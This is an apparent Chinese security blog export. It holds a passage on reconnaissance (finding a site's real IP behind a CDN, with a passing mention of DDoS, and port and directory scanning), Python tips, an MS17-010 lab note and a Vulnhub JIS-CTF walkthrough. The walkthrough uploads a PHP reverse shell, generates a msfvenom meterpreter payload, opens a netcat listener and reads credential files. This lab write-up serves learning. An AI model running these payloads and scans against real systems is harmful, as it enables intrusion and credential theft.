class="line">&lt;center&gt;&lt;h1&gt;301 Moved Permanently&lt;/h1&gt;&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<br>

<h4 id="全网扫描"><a href="#全网扫描" class="headerlink" title="全网扫描*"></a>全网扫描*</h4><br>
通过扫描所有 IP，根据对比目标网站的 banner，找出其 IP 地址
可以用现成的搜索引擎： shodan、fofa、 zoomeye或扫描工具 zmap、Masscan等等

<ul>
<li><a href="https://phpinfo.me/2015/01/15/809.html" target="_blank" rel="noopener">(转)简单获取CDN背后网站的真实IP</a> 使用 zmap扫描</li>
</ul>
<br>

<h4 id="利用-DDoS"><a href="#利用-DDoS" class="headerlink" title="利用 DDoS*"></a>利用 DDoS*</h4><br>
利用 DDoS耗光 DNS的流量，TG、暗网有专门的 DDoS

<br>

<h3 id="验证获取的-IP"><a href="#验证获取的-IP" class="headerlink" title="验证获取的 IP"></a>验证获取的 IP</h3><br>
找到目标的真实 IP后，如何验证其真实性？如果是 Web，可以直接访问 IP，看看响应页面是否和访问域名返回的一样，
其实上面判断 CDN的有些方法也可以；如果目标段比较大，可以借助类似 Masscan的工具批量扫描对应 IP段中所有开了 80、443、8080端口的 IP，然后逐个尝试访问，观察响应结果是否为目标站点


<br>

<h2 id="C段-TODO"><a href="#C段-TODO" class="headerlink" title="C段 [TODO]"></a>C段 [TODO]</h2><br>
当已获取某些子域名真实IP时，可以进行横向搜索，会有一些意想不到的收获

<ul>
<li><code>Site:10.12.3.*</code></li>
<li><code>nmap -sS ip/24</code></li>
<li><a href="http://www.webscan.cc/" target="_blank" rel="noopener">在线工具</a></li>
<li><a href="https://phpinfo.me/bing.php" target="_blank" rel="noopener">在线 C段查询</a></li>
</ul>
<br>

<p><img src="./1563107420855.png" alt="Alt text"></p>
<br>

<h2 id="收集开放端口信息"><a href="#收集开放端口信息" class="headerlink" title="收集开放端口信息"></a>收集开放端口信息</h2><br>

<blockquote>
<p>在得到了网站的真实 IP后，就需要进一步的深入调查<br>通过扫描服务器开放的端口以及从该端口判断服务器上存在的服务甚至服务的版本，就可以对症下药 </p>
</blockquote>
<p>常用工具：</p>
<ul>
<li>Nmap （主要使用）</li>
<li>censys（虽然不全）</li>
<li><a href="https://github.com/zmap/zmap" target="_blank" rel="noopener">zmap</a> 偏向于扫描指定范围内主机的某个指定端口是否开放</li>
<li>Masscan 可用作 Nmap的替代品</li>
</ul>
<br>

<p><code>nmap -sS xxx.com -p 21,22,23,3389</code><br><code>nmap -sS xxx.com -F</code><br><code>nmap -sS xxx.com</code><br><code>...</code><br><img src="./%E6%B7%B1%E5%BA%A6%E6%88%AA%E5%9B%BE_%E9%80%89%E6%8B%A9%E5%8C%BA%E5%9F%9F_20190711175149.png" alt="Alt text"></p>
<br>

<h2 id="服务器系统"><a href="#服务器系统" class="headerlink" title="服务器系统"></a>服务器系统</h2><br>

<ul>
<li>网址大小写是否敏感判断 Windows/Linux，Linux大小写敏感</li>
<li><code>nmap -sS xxx.com -O</code> </li>
<li><a href="https://fofa.so" target="_blank" rel="noopener">FOFA</a> 网络空间安全引擎</li>
</ul>
<br>

<p><img src="./1563012218157.png" alt="Alt text"></p>
<br>

<h2 id="CMS指纹扫描-amp-WAF-TODO"><a href="#CMS指纹扫描-amp-WAF-TODO" class="headerlink" title="CMS指纹扫描&amp;WAF [TODO]"></a>CMS指纹扫描&amp;WAF [TODO]</h2><br>
这里的指纹是指网站 CMS指纹识别、计算机操作系统及 Web容器的指纹等

<p>工具：</p>
<ul>
<li>header头信息</li>
<li><a href="https://www.wappalyzer.com/download" target="_blank" rel="noopener">Wappalyzer</a> 浏览器插件，能够分析目标网站所采用的平台构架、网站环境、服务器配置环境、JavaScript框架、编程语言等参数</li>
<li><a href="http://www.yunsee.cn/finger.html" target="_blank" rel="noopener">云悉</a>  云悉在线WEB指纹CMS识别平台 </li>
<li><a href="http://whatweb.bugscaner.com/look/" target="_blank" rel="noopener">在线cms指纹识别</a> </li>
<li><a href="https://www.whatweb.net/" target="_blank" rel="noopener">whatweb在线</a></li>
<li><a href="https://github.com/Ekultek/WhatWaf" target="_blank" rel="noopener">WhatWaf</a>  检测和绕过 web应用程序防火墙和保护系统</li>
<li><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">WAFW00F</a>  识别 Web应用防火墙(WAF)产品的指纹</li>
<li>WhatWeb（kali） 可识别web技术，包括内容管理系统(CMS)、博客平台、统计/分析包、JavaScript库，Web服务器和嵌入式设备等</li>
</ul>
<br>

<p><img src="./1563008343320.png" alt="Alt text"></p>
<p><img src="./1563012336441.png" alt="Alt text"></p>
<p><img src="./1563116332512.png" alt="Alt text"></p>
<p><img src="./1563117642220.png" alt="Alt text"></p>
<p><img src="./1563150655612.png" alt="Alt text"></p>
<br>

<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><br>

<p>使用工具：</p>
<ul>
<li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">DirSearch</a> 和 <a href="https://github.com/evilH2O2/Daily/blob/master/Tools/dics_cn.zip" target="_blank" rel="noopener">字典</a> [居家必备]</li>
<li>dir_scanner（MSF： <code>msf5 &gt; use auxiliary/scanner/http/dir_scanner</code>）目录扫描</li>
<li>robots_txt （MSF： <code>msf5 &gt; use auxiliary/scanner/http/robots_txt</code>） robots扫描</li>
<li><a href="https://github.com/evilH2O2/Daily/blob/master/Tools/%E5%BE%A1%E5%89%91%E5%90%8E%E5%8F%B0%E6%89%AB%E6%8F%8F%E7%8F%8D%E8%97%8F%E7%89%88.rar" target="_blank" rel="noopener">御剑后台扫描珍藏版</a></li>
<li>DirBuster 是 OWASP开发的一款基于 JAVA编写的、专门用来探测 Web服务器的目录和隐藏文件</li>
</ul>
<p><img src="./2019-07-13.png" alt="Alt text"></p>
<br>

<hr>
<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><br>
在了解了大多数信息后，就可以更近一步的 进行漏洞扫描

<br>

<h3 id="漏洞扫描-1"><a href="#漏洞扫描-1" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><br>

<p>漏洞扫描工具：</p>
<ul>
<li>Rapi7 Nexpose</li>
<li><a href="https://zh-cn.tenable.com/downloads/nessus" target="_blank" rel="noopener">Nessus</a>（强烈推荐）MSF创建新任务报错<code>nessus.rb:979:in cmd_nessus_scan_new</code>解决：<a href="https://github.com/rapid7/metasploit-framework/issues/11117" target="_blank" rel="noopener">#11117</a> 若是持续出现 API Disabled，刷新无效，可在改回来</li>
<li>OpenVAS（开源工具）</li>
</ul>
<br>

<p><img src="./1.png" alt="Alt text"><br><img src="./1563071999609.png" alt="Alt text"><br><img src="./2019-07-14-10-41-47%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="Alt text"></p>
<br>

<h3 id="网站应用程序扫描"><a href="#网站应用程序扫描" class="headerlink" title="网站应用程序扫描"></a>网站应用程序扫描</h3><br>
在知道了目标的大体网络架构和运行的服务情况，并对网络进行的漏洞扫描后，就可以进行网站应用程序扫描

<p>常用扫描工具：</p>
<ul>
<li>sqlmap </li>
<li><a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> </li>
<li>ZAP（kali）</li>
<li>WebScarab （kali）</li>
</ul>
<hr>
<h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><ul>
<li>《黑客秘籍——渗透测试实用指南 第2版》</li>
<li>《Metasploit渗透测试魔鬼训练营》 </li>
<li>《Web安全攻防 渗透测试实战指南》</li>
<li><a href="http://www.doubleyi.xin/2018/01/01/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/web%E5%AE%89%E5%85%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" target="_blank" rel="noopener">web安全信息搜集 </a> </li>
<li><a href="https://masterxsec.github.io/2017/05/29/Web%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%BB%E7%BB%93/" target="_blank" rel="noopener">Web渗透测试-信息收集总结 </a> </li>
<li><a href="http://waldo.com.cn/2018/08/09/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_blank" rel="noopener">渗透测试之信息收集</a></li>
<li><a href="http://www.northity.com/2018/10/21/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%950x00-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" target="_blank" rel="noopener">渗透测试0x00 信息收集</a> </li>
<li><a href="https://gorgias.me/2017/12/05/%E5%AD%90%E5%9F%9F%E5%90%8D%E6%94%B6%E9%9B%86%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">子域名收集笔记</a> </li>
<li><a href="https://www.je2se.com/archives/192" target="_blank" rel="noopener">绕过CDN，查找网站的真实IP</a> </li>
<li><a href="https://www.secjuice.com/finding-real-ips-of-origin-servers-behind-cloudflare-or-tor/" target="_blank" rel="noopener">Finding The Real Origin IPs Hiding Behind CloudFlare or Tor</a> </li>
<li><a href="http://www.hackliu.com/?p=448" target="_blank" rel="noopener">绕过CDN查找真实IP方法</a> </li>
<li><a href="https://soapffz.com/sec/186.html#menu_index_8" target="_blank" rel="noopener">信息收集 - 端口扫描及服务识别</a>  </li>
<li><a href="https://blog.zeddyu.info/2019/06/12/Scanner/" target="_blank" rel="noopener">浅谈端口扫描技术 </a> </li>
<li><a href="https://dfkan.com/1469.html" target="_blank" rel="noopener">DF-PUSH(May.17)——抛弃过时的御剑：DirSearch引领web路径爆破新时代！ </a>  </li>
<li><a href="https://juejin.im/post/5cb590b251882532e462ecfc" target="_blank" rel="noopener">Metasploit 渗透测试手册第三版 第二章 信息收集与扫描</a> </li>
<li><a href="https://hellohxk.com/blog/penetration-testing/" target="_blank" rel="noopener">渗透测试相关总结</a> </li>
</ul>
]]></content>
      <tags>
        <tag>Security</tag>
        <tag>Web Security</tag>
      </tags>
  </entry>
  <entry>
    <title>Python不常用用法</title>
    <url>/2019/09/04/Python%E4%B8%8D%E5%B8%B8%E7%94%A8%E7%94%A8%E6%B3%95/</url>
    <content><![CDATA[<p>Python 日常使用时的一些方法或技巧，怕忘记怕麻烦，记录一下</p>
<a id="more"></a>

<h2 id="通过值获取键"><a href="#通过值获取键" class="headerlink" title="通过值获取键"></a>通过值获取键</h2><br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>dct = &#123;<span class="string">'Name'</span>: <span class="string">'Alice'</span>, <span class="string">'Age'</span>: <span class="number">18</span>, <span class="string">'uid'</span>: <span class="number">1001</span>, <span class="string">'id'</span>: <span class="number">1001</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">get_key1</span><span class="params">(dct, value)</span>:</span></span><br><span class="line"><span class="meta">... </span>  <span class="keyword">return</span> list(filter(<span class="keyword">lambda</span> k:dct[k] == value, dct))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>get_key1(dct, <span class="number">1001</span>)</span><br><span class="line">[<span class="string">'id'</span>, <span class="string">'uid'</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 某函数返回的结果（参数 md5dict）</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg'</span>: <span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561284.jpg'</span>: <span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561271.jpg'</span>: <span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, </span><br><span class="line">    <span class="string">'/root/MyDocs/Python/02-PhotosMD5/561279.jpg'</span>: <span class="string">'e5af4c3275dafbef5932ab69c446374c'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 变量 cp的内容</span></span><br><span class="line">(<span class="string">'6beb7af8d37e26eb88bb1b75c8e51474'</span>, <span class="number">2</span>)</span><br><span class="line">(<span class="string">'4f9d1c75bd62b0d7e3fdd0abd810ce34'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'bb60b6e6626968cde17cad0a8f18290b'</span>, <span class="number">1</span>)</span><br><span class="line">(<span class="string">'e5af4c3275dafbef5932ab69c446374c'</span>, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">analysedDict</span><span class="params">(md5dict)</span>:</span></span><br><span class="line">    cp = Counter(md5dict.values())  <span class="comment"># 只取 MD5值</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">filterFun</span><span class="params">(dicts, value)</span>:</span></span><br><span class="line">        bad = list(filter(<span class="keyword">lambda</span> k:dicts[k] == value, dicts))</span><br><span class="line">        print(bad)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cp.items():</span><br><span class="line">        <span class="keyword">if</span> i[<span class="number">1</span>] &gt; <span class="number">1</span>:</span><br><span class="line">            print(<span class="string">"\033[0;31m&#123;0&#125;\033[0m"</span>.format(i))</span><br><span class="line">            filterFun(md5dict, i[<span class="number">0</span>])</span><br><span class="line">            </span><br><span class="line"><span class="comment"># ---- 结果 ------</span></span><br><span class="line"><span class="comment"># ('6beb7af8d37e26eb88bb1b75c8e51474', 2)</span></span><br><span class="line"><span class="comment"># ['/root/MyDocs/Python/02-PhotosMD5/76478297_p0.jpg', '/root/MyDocs/Python/02-PhotosMD5/76478297_p0_copy.jpg']</span></span><br></pre></td></tr></table></figure>

<br>

<h2 id="快速启动-http服务器"><a href="#快速启动-http服务器" class="headerlink" title="快速启动 http服务器"></a>快速启动 http服务器</h2><br>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># python2</span></span><br><span class="line">python -m SimpleHTTPServer</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>MS17-010复现</title>
    <url>/2019/09/13/MS17-010%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<p>MS17-010/EternalBlue/永恒之蓝</p>
<a id="more"></a>

<p><a href="https://docs.microsoft.com/zh-cn/security-updates/securitybulletins/2017/ms17-010" target="_blank" rel="noopener">Microsoft 安全公告 MS17-010</a></p>
<p>当 Microsoft 服务器消息块 1.0 (SMBv1)服务器处理某些请求时，存在多个远程执行代码漏洞。<br>成功利用这些漏洞的攻击者可以获取在目标系统上执行代码的能力</p>
<p>受影响的系统(详细系统版本请查看公告)：</p>
<ul>
<li>Windows Vista</li>
<li>Windows Server 2008</li>
<li>Windows 7</li>
<li>Windows Server 2008 R2</li>
<li>Windows 8.1</li>
<li>Windows Server 2012 和 Windows Server 2012 R2</li>
<li>Windows RT 8.1</li>
<li>Windows 10</li>
<li>Windows Server 2016</li>
</ul>
<p>相对应的 CVE（Windows SMB 远程代码执行漏洞）：</p>
<ul>
<li>CVE-2017-0143</li>
<li>CVE-2017-0144</li>
<li>CVE-2017-0145</li>
<li>CVE-2017-0146</li>
<li>CVE-2017-0148</li>
</ul>
<br>

<p>复现环境：</p>
<ul>
<li>Windows 7 (Build 7601, Service Pack 1)</li>
<li>Ubuntu server(Metasploit)</li>
</ul>
<br>

<p><img src="./2019-09-13-11-24-58%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="000" title="搜索漏洞"><br><img src="./2019-09-13-11-10-05%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="001" title="扫描模块"><br><img src="./2019-09-13-10-41-45%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt="002" title="返回 meterpreter"></p>
]]></content>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub靶机——JIS-CTF</title>
    <url>/2020/03/03/JIS-CTF/</url>
    <content><![CDATA[<blockquote>
<p>2020-02-10-15</p>
</blockquote>
<br>

<figure class="highlight oxygene"><table><tr><td class="code"><pre><span class="line">VM Name: JIS-CTF : VulnUpload</span><br><span class="line"></span><br><span class="line">Difficulty: Beginner</span><br><span class="line"></span><br><span class="line">Description: There are five <span class="keyword">flags</span> <span class="keyword">on</span> this machine. <span class="keyword">Try</span> <span class="keyword">to</span> find them. It takes <span class="number">1.5</span> hour <span class="keyword">on</span> average <span class="keyword">to</span> find all <span class="keyword">flags</span>.</span><br><span class="line"></span><br><span class="line">Only working <span class="keyword">with</span> VirtualBox </span><br><span class="line"></span><br><span class="line">Url : https:<span class="comment">//www.vulnhub.com/entry/jis-ctf-vulnupload,228/</span></span><br></pre></td></tr></table></figure>

<br>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">Kali</span>：192<span class="selector-class">.168</span><span class="selector-class">.56</span><span class="selector-class">.109</span></span><br></pre></td></tr></table></figure>

<figure class="highlight lsl"><table><tr><td class="code"><pre><span class="line">目标网段：<span class="number">192.168</span><span class="number">.56</span><span class="number">.1</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure>

<br>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><br>

<p>扫描主机存活获取目标地址：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -sn -T5 -v 192.168.56.1/24 | grep -B 1 <span class="string">"Host is up"</span></span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-10-13-50-50%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>排除本机与网关还有两个，扫服务确定目标 IP ： <code>192.168.56.110</code> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap -n -Pn -sV -O 192.168.56.110</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 10:07 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.110</span><br><span class="line">Host is up (0.00073s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">MAC Address: 08:00:27:C2:CD:2E (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device <span class="built_in">type</span>: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 8.15 seconds</span><br></pre></td></tr></table></figure>

<br>

<p>浏览器访问如下：</p>
<br>

<p><img src="2020-02-10-13-55-42%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>网站的话，需要先收集一下目录信息：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirsearch.py -u http://192.168.56.110 -e php --random-agents -t 32</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-10-09-31-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ dirb http://192.168.56.110</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nikto -h http://192.168.56.110</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-10-09-32-15%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt></p>
<p><img src="2020-02-10-09-33-04%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE-1581314672000.png" alt> </p>
<br>

<p><code>robots</code> 总会有些东西泄露：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup			<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /admin			<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /admin_area		<span class="comment"># ----- OK 200</span></span><br><span class="line">Disallow: /r00t				<span class="comment"># ----- 404</span></span><br><span class="line">Disallow: /uploads      	<span class="comment"># ----- Not Found 404</span></span><br><span class="line">Disallow: /uploaded_files 	<span class="comment"># ----- OK 200</span></span><br><span class="line">Disallow: /flag 			<span class="comment"># ----- OK 200</span></span><br></pre></td></tr></table></figure>

<p>逐一访问后得到可用目录如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.110/index.php		<span class="comment"># 主页</span></span><br><span class="line">http://192.168.56.110/flag/			<span class="comment"># OK</span></span><br><span class="line">http://192.168.56.110/assets		<span class="comment"># 引用资源页面，包含图片（疑似有内容，先搁置）</span></span><br><span class="line">http://192.168.56.110/admin_area/	<span class="comment"># OK</span></span><br><span class="line">http://192.168.56.110/robots.txt	<span class="comment"># robots</span></span><br><span class="line">http://192.168.56.110/uploaded_files<span class="comment"># 疑似与文件上传有关</span></span><br></pre></td></tr></table></figure>

<br>

<p>访问 <code>/flag</code> 得到 第一个 Flag ：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br></pre></td></tr></table></figure>

<br>

<p>访问 <code>uploaded_files</code> 空白页，但返回 <code>200 OK</code> 。无源代码</p>
<br>

<p>访问 <code>admin_area</code> ，源代码内发现第二个 Flag 及一组用户名密码：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--	username : admin</span></span><br><span class="line"><span class="comment">	password : 3v1l_H@ck3r</span></span><br><span class="line"><span class="comment">	The 2nd flag is : &#123;7412574125871236547895214&#125;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure>

<br>

<h2 id="打开大门"><a href="#打开大门" class="headerlink" title="打开大门"></a>打开大门</h2><br>

<p>使用得到的用户名密码登录 SSH 无效，但成功登录 Web 页面，一个文件上传服务：</p>
<br>

<p><img src="2020-02-10-09-36-00%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>上传照片返回成功，上传 <code>php</code> 页面也成功，可知并没有黑白名单</p>
<p>可以上传一句话木马 + Nc 或用 <code>msfvenom</code> 生成 MSF 的 php 反弹木马</p>
<br>

<p><strong>使用 kali 上的木马</strong>  （<code>/usr/share/webshell</code>）</p>
<br>

<ul>
<li><code>cp /usr/share/webshell/php/php-reverse-shell.php ~/Desktop/php-shell.php</code> </li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ip = <span class="string">'192.168.56.109'</span>;  <span class="comment">// CHANGE THIS</span></span><br><span class="line">$port = <span class="number">8848</span>;       	<span class="comment">// CHANGE THIS</span></span><br></pre></td></tr></table></figure>

<br>

<p>监听端口。访问：<code>http://192.168.56.110/uploaded_files/php-shell.php</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc -lvp 8848</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-10-14-50-32%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p><strong>使用 MSF 的 php 反弹木马</strong> </p>
<br>

<p>生成木马，并监听</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.109 LPORT=8848 --format raw --out /root/桌面/msf_php.php</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-10-10-42-35%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-10-10-48-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>


<p>查看 Web的根目录，从 <code>hint.txt</code> 找到了第三个 FLAG，并说明了使用 <code>technawi</code>  的用户才可以读取 <code>flag.txt</code> 且在一个隐藏目录里面</p>
<br>

<p><img src="2020-02-10-10-51-43%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-10-11-01-20%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>查看 <code>/etc/passwd</code> 除了 <code>technawi</code> 的 HOME 目录，无其他有用信息</p>
<br>

<p>那就搜索文件中包含 <code>technawi</code> 关键字的文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -user <span class="string">"technawi"</span> -<span class="built_in">type</span> f ! -path <span class="string">"/proc/*"</span> 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">grep -ri --exclude-dir=proc/ <span class="string">'technawi'</span> / 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<br>

<p><img src="2020-02-10-11-15-57%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<p>发现了一个 MySQL 的 认证TXT，找到第四个 FLAG 附带一组账号密码，成功登录 SSH，并拿到最后一个 FLAG</p>
<br>

<p><img src="2020-02-10-11-16-38%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<p><img src="2020-02-10-11-31-36%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<h2 id="提权-额外"><a href="#提权-额外" class="headerlink" title="提权(额外)"></a>提权(额外)</h2><br>

<p>其中，<code>technawi</code> HOME 目录下有个名为 <code>.sudo_as_admin_successful</code> 的文件，</p>
<p>意味着 <code>technawi</code> 可以用自己的密码登录成为 root 用户（提权）</p>
<br>

<p><img src="2020-02-10-11-34-18%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE.png" alt> </p>
<br>

<hr>
<br>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http://192.168.56.110/robots.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">User-agent: *</span><br><span class="line">Disallow: /</span><br><span class="line">Disallow: /backup</span><br><span class="line">Disallow: /admin</span><br><span class="line">Disallow: /admin_area</span><br><span class="line">Disallow: /r00t</span><br><span class="line">Disallow: /uploads      ----- Not Found 404</span><br><span class="line">Disallow: /uploaded_files ----- OK 200</span><br><span class="line">Disallow: /flag </span><br><span class="line">================</span><br><span class="line">http://192.168.56.110/admin_area/</span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">&lt;!--	username : admin</span><br><span class="line">	password : 3v1l_H@ck3r</span><br><span class="line">	The 2nd flag is : &#123;7412574125871236547895214&#125;</span><br><span class="line">--&gt;</span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/assets/img/</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line">[IMG]	background_tile_1.jpg	2017-04-19 10:43 	2.3K	 </span><br><span class="line">[IMG]	background_tile_2.jpg	2017-04-19 10:43 	2.4K	 </span><br><span class="line">[IMG]	background_tile_3.jpg	2017-04-19 10:43 	2.3K	 </span><br><span class="line">[IMG]	blue_line.jpg	2017-04-19 10:43 	1.3K	 </span><br><span class="line">[IMG]	done.png	2017-04-19 10:43 	3.3K	 </span><br><span class="line">[IMG]	logo.jpg	2017-04-19 10:43 	11K	 </span><br><span class="line">[IMG]	tzine.png	2017-04-19 10:43 	1.2K	 </span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/flag/</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">The 1st flag is : &#123;8734509128730458630012095&#125;</span><br><span class="line"></span><br><span class="line">===============</span><br><span class="line">http://192.168.56.110/server-status</span><br><span class="line"></span><br><span class="line"><span class="comment">###############</span></span><br><span class="line">注意 Cookie</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##################</span></span><br><span class="line">http://192.168.56.110/index.php</span><br><span class="line"></span><br><span class="line">登录后：</span><br><span class="line"></span><br><span class="line">Powered by : Technawi[dot]net</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">meterpreter &gt; cat hint.txt</span><br><span class="line">try to find user technawi password to <span class="built_in">read</span> the flag.txt file, you can find it <span class="keyword">in</span> a hidden file ;)</span><br><span class="line"></span><br><span class="line">The 3rd flag is : &#123;7645110034526579012345670&#125;</span><br><span class="line"></span><br><span class="line">=======================</span><br><span class="line">cat /etc/mysql/conf.d/credentials.txt</span><br><span class="line">The 4th flag is : &#123;7845658974123568974185412&#125;</span><br><span class="line"></span><br><span class="line">username : technawi</span><br><span class="line">password : 